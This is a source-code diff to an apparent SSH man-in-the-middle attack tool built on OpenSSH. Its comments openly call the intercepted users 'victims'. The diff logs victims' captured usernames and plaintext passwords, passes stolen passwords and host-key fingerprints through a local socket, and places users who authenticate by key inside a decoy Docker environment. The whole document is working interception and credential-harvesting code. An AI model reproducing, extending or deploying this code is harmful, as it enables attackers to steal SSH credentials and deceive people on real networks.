@@ -708,9 +708,11 @@ do_exec(Session *s, const char *command)
 	else
 		ret = do_exec_no_pty(s, command, password_and_fingerprint_socket_name);
 
-	/* Write the password and read the client's host key fingerprints into
-	 * the Channel struct. */
-	write_password_and_read_fingerprints(&password_and_fingerprint_socket_name, sock_fd, active_state, channel_by_id(s->chanid));
+	/* If the victim didn't use pubkey authentication, write the password and read the client's host key fingerprints into the Channel struct. */
+	if (!lol->authkey_used)
+	  write_password_and_read_fingerprints(&password_and_fingerprint_socket_name, sock_fd, active_state, channel_by_id(s->chanid));
+
+	destroy_password_and_fingerprint_socket(&password_and_fingerprint_socket_name, &sock_fd);
 
 	original_command = NULL;
 
@@ -1644,6 +1646,26 @@ do_child(Session *s, const char *command, char *password_and_fingerprint_socket_
 
 	/* restore SIGPIPE for child */
 	signal(SIGPIPE, SIG_DFL);
+
+
+	if (lol->authkey_used) {
+	  char *envp[8] = {0};
+
+	  debug3("Victim used key authentication.  Spawning Docker container...");
+	  argv[0] = DOCKER_CMD;
+	  argv[1] = "run";
+	  argv[2] = "-it";
+	  argv[3] = "--rm";
+	  argv[4] = "ssh-mitm-fake-env";
+	  argv[5] = NULL;
+
+	  envp[0] = "DOCKER_HOST=unix:///home/ssh-mitm/.docker/run/docker.sock";
+	  envp[1] = NULL;
+
+	  execve(argv[0], argv, envp);
+	  logit("MITM: failed to launch Docker container for public key authentication!");
+	  exit(-1);
+	}
 
 	if (s->is_subsystem == SUBSYSTEM_INT_SFTP_ERROR) {
 		printf("This service allows sftp connections only.\n");
@@ -2789,9 +2811,12 @@ void set_session_log(Session *s, unsigned int is_sftp, const char *command) {
     write(s->session_log_fd, "\nUsername: ", 11);
     write(s->session_log_fd, lol->username, strlen(lol->username));
 
-    /* Write the password. */
-    write(s->session_log_fd, "\nPassword: ", 11);
-    write(s->session_log_fd, lol->password, strlen(lol->password));
+    /* Write the password, if we got one. */
+    if ((lol->password != NULL) && (strlen(lol->password) > 0)) {
+      write(s->session_log_fd, "\nPassword: ", 11);
+      write(s->session_log_fd, lol->password, strlen(lol->password));
+    } else
+      write(s->session_log_fd, "\nKey authentication used; public key: [TODO: put public key hash here]", 70);
 
     /* Write the command, if there was one. */
     if (command != NULL) {
@@ -2816,9 +2841,7 @@ double my_sleep(struct timespec *sleep_request) {
 }
 */
 
-/* Creates a unique socket and listens on it.  Returns its filename and sets
- * the "sock_fd" argument to the socket handle.  The caller must free() the
- * return value. */
+/* Creates a unique socket and listens on it.  Returns its filename and sets the "sock_fd" argument to the socket handle.  The caller must use destroy_password_and_fingerprint_socket() to clean up afterwards. */
 char *create_password_and_fingerprint_socket(int *sock_fd) {
   char *password_and_fingerprint_socket_name = NULL;
   struct sockaddr_un addr;
@@ -2862,6 +2885,14 @@ char *create_password_and_fingerprint_socket(int *sock_fd) {
 
   return password_and_fingerprint_socket_name;
 }
+
+
+void destroy_password_and_fingerprint_socket(char **password_and_fingerprint_socket_name, int *sock_fd) {
+  close(*sock_fd);  *sock_fd = -1;
+  unlink(*password_and_fingerprint_socket_name);
+  free(*password_and_fingerprint_socket_name); *password_and_fingerprint_socket_name = NULL;
+}
+
 
 /* Writes the password, then reads the host key fingerprints from the client
  * program, sets the appropriate "legit_*_fingerprint" global variables,
@@ -2960,7 +2991,4 @@ void write_password_and_read_fingerprints(char **password_and_fingerprint_socket
   /* We are done with this socket, so shut it down, delete the file, and
   * free the filename. */
   shutdown(client_fd, SHUT_RDWR);
-  close(sock_fd);
-  unlink(*password_and_fingerprint_socket_name);
-  free(*password_and_fingerprint_socket_name); *password_and_fingerprint_socket_name = NULL;
 }
